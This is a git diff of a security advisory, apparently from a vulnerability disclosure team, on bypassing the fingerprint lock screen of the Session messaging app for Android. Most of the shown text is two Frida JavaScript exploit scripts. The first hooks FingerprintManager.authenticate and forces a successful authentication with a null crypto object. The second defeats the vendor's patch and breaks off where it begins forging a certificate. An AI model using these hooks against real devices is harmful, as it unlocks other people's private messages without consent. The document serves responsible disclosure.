@@ -70,7 +70,7 @@ altogether and proceed to use the application.
 Attached below is a proof-of-concept video showing the
 exploitation of the vulnerability:
 
-![POC-Bypass-Fingerprint-Session](./poc.mp4)
+![POC-Bypass-Fingerprint-Session](https://res.cloudinary.com/fluid-attacks/image/upload/v1656528777/airs/advisories/tempest/poc.gif)
 
 ### Steps to reproduce
 
@@ -98,19 +98,36 @@ exploitation of the vulnerability:
 
 ```js
 // exploit.js
-const getAuthResult = (AuthenticationResult, crypto) => AuthenticationResult.$new(crypto, null, 0);
+const getAuthResult = (AuthenticationResult, crypto) => AuthenticationResult.$new(
+    crypto, null, 0
+);
 
 const exploit = () => {
     console.log("[+] Hooking PassphrasePromptActivity - Method resumeScreenLock");
-    const AuthenticationResult = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
-    const FingerprintManager  = Java.use('android.hardware.fingerprint.FingerprintManager');
-    const CryptoObject = Java.use('android.hardware.fingerprint.FingerprintManager$CryptoObject');
+    const AuthenticationResult = Java.use(
+        'android.hardware.fingerprint.FingerprintManager$AuthenticationResult'
+    );
+    const FingerprintManager  = Java.use(
+        'android.hardware.fingerprint.FingerprintManager'
+    );
+    const CryptoObject = Java.use(
+        'android.hardware.fingerprint.FingerprintManager$CryptoObject'
+    );
 
     console.log("Hooking FingerprintManagerCompat.authenticate()...");
-    const fingerprintManager_authenticate = FingerprintManager['authenticate'].overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler');;
+    const fingerprintManager_authenticate = FingerprintManager['authenticate'].overload(
+        'android.hardware.fingerprint.FingerprintManager$CryptoObject',
+        'android.os.CancellationSignal',
+        'int',
+        'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback',
+        'android.os.Handler'
+    );
 
-    fingerprintManager_authenticate.implementation = (crypto, cancel, flags, callback, handler) => {
+    fingerprintManager_authenticate.implementation = (
+        crypto, cancel, flags, callback, handler) => {
         console.log("Bypass Lock Screen - Fingerprint");
+
+        // We send a null cryptoObject to the listener of the fingerprint
         var crypto = CryptoObject.$new(null);
         var authenticationResult = getAuthResult(AuthenticationResult, crypto);
         callback.onAuthenticationSucceeded(authenticationResult);
@@ -129,21 +146,43 @@ After reporting the security flaw, the Session team implemented a [patch](https:
 However, I managed to bypass the patch using the following exploit:
 
 ```js
-const getAuthResult = (AuthenticationResult, crypto) => AuthenticationResult.$new(crypto, null, 0);
+// exploit.js
+const getAuthResult = (AuthenticationResult, crypto) => AuthenticationResult.$new(
+    crypto, null, 0
+);
 
 const exploit = () => {
     console.log("[+] Hooking PassphrasePromptActivity - Method resumeScreenLock");
-    const KeyPairGenerator = Java.use('java.security.KeyPairGenerator');
-    const Signature = Java.use('java.security.Signature');
-    const BiometricSecretProvider = Java.use('org.thoughtcrime.securesms.crypto.BiometricSecretProvider');
-    const AuthenticationResult = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
-    const FingerprintManager  = Java.use('android.hardware.fingerprint.FingerprintManager');
-    const CryptoObject = Java.use('android.hardware.fingerprint.FingerprintManager$CryptoObject');
+    const KeyPairGenerator = Java.use(
+        'java.security.KeyPairGenerator'
+    );
+    const Signature = Java.use(
+        'java.security.Signature'
+    );
+    const BiometricSecretProvider = Java.use(
+        'org.thoughtcrime.securesms.crypto.BiometricSecretProvider'
+    );
+    const AuthenticationResult = Java.use(
+        'android.hardware.fingerprint.FingerprintManager$AuthenticationResult'
+    );
+    const FingerprintManager  = Java.use(
+        'android.hardware.fingerprint.FingerprintManager'
+    );
+    const CryptoObject = Java.use(
+        'android.hardware.fingerprint.FingerprintManager$CryptoObject'
+    );
 
     console.log("Hooking FingerprintManagerCompat.authenticate()...");
-    const fingerprintManager_authenticate = FingerprintManager['authenticate'].overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler');
+    const fingerprintManager_authenticate = FingerprintManager['authenticate'].overload(
+        'android.hardware.fingerprint.FingerprintManager$CryptoObject',
+        'android.os.CancellationSignal',
+        'int',
+        'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback',
+        'android.os.Handler'
+    );
 
-    fingerprintManager_authenticate.implementation = (crypto, cancel, flags, callback, handler) => {
+    fingerprintManager_authenticate.implementation = (
+        crypto, cancel, flags, callback, handler) => {
         console.log("Bypass Lock Screen - Fingerprint");
 
         // Create Certificate
